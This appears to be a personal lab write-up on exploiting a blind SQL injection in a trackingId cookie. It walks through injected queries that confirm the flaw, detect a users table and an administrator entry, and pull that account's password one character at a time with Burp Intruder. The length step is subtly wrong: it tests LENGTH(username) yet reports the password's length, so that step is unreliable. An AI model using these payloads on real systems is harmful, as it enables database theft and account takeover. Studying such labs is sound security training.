Blind SQLi - trackingId cookie

"Welcome back" message if the query returns any rows.

db - `users` table with `username`, `password` columns.


Goal: 
1- Enumerate the password of the user 'administrator'
2- login as the user 'administrator'


Process:

SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' -> base query -> welcome message.
SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzHSOMETHING' -> no welcome message.

SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and 1=1--' -> welcome message
SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and 1=2--' -> no welcome message

- that means there's a blind sql injection

Prove that there's a table called `users`:
SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select 'x' from users LIMIT 1)='x' --' -> Welcome back > there's a table called users;

Prove that there's a `username` column and username value called `administrator`:
SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select username from users WHERE username='administrator')='administrator' --' -> Welcome back -> there's username column and an entry called administrator

Enumerate over the length of `administrator` user:
SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select username from users WHERE username='administrator' and LENGTH(username)>1)='administrator' --' -> Burp Intruder -> password has ***13*** chars.

Enumerate every char in the password:
SELECT trackId FROM trackingTable WHERE trackId = '5Q8r4dnFkuKf5KzH' and (select substring(password,$i$,1) from users WHERE username='administrator')='$j$' --' -> if we got welcome message, that means the first char is 'a'
